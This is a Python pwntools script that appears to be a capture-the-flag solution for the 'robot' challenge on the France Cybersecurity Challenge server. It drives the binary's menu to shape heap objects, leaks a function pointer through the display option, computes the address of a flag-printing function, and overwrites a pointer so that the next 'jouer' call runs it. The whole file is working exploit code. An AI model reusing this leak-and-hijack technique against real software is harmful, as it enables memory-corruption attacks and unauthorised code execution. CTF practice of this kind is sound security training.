#!/usr/bin/env python3

from pwn import *
from time import sleep

HOST = "challenges.france-cybersecurity-challenge.fr"
PORT = 2101

exe = ELF("./robot")

context.log_level = 'info'

def conn():
    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        #r = process(["strace", "-o", "strace.out", "./robot"])
        r = process(["./robot"])
    return r

def menu(r):
    log.info("Menu")
    rep = r.recvuntil(b'> ')
    # print(rep)

def construire(r, name):
    log.info("Construire")
    r.send(b'1\n')
    r.recvuntil(b'> ')
    r.send(name + b'\n')
    rep = r.recvuntil(b'> ')
    print(rep)

def talk(r):
    log.info("Parler")
    r.send(b'2\n')
    rep = r.recvuntil(b'> ')
    print(rep)

def jouer(r):
    log.info("Jouer")
    r.send(b'3\n')
    rep = r.recvuntil(b'> ')
    print(rep)

def rediger(r, text):
    log.info("Rediger")
    r.send(b'4\n')
    r.recvuntil(b'> ')
    r.send(text + b'\n')
    rep = r.recvuntil(b'> ')
    print(rep)

def afficher(r):
    log.info("Afficher")
    r.send(b'5\n')
    rep = r.recvuntil(b'> ')
    print(rep)
    leak = rep.split(b'\n')[1]
    return leak

def main():
    global r

    admin_addr = 0x5555555553d7
    cat_flag_addr = 0x55555555547c
    roll_addr = 0x5555555552fc
    offset = cat_flag_addr-roll_addr

    r = conn()
    menu(r)

    construire(r,b'A' * 16)
    construire(r,b'B' * 8)
    jouer(r)
    rediger(r, b'Z'*15)
    leak = afficher(r)
    roll_leak = u64(leak[8:16])
    cat_flag_leak = roll_leak + offset

    log.info(f"Leak cat pass : {hex(cat_flag_leak)}")

    construire(r,b'A' * 16)
    jouer(r)
    rediger(r, b'Z'*16 + p64(cat_flag_leak)*2)
    jouer(r)
    print(r.recv())
if __name__ == "__main__":
    main()
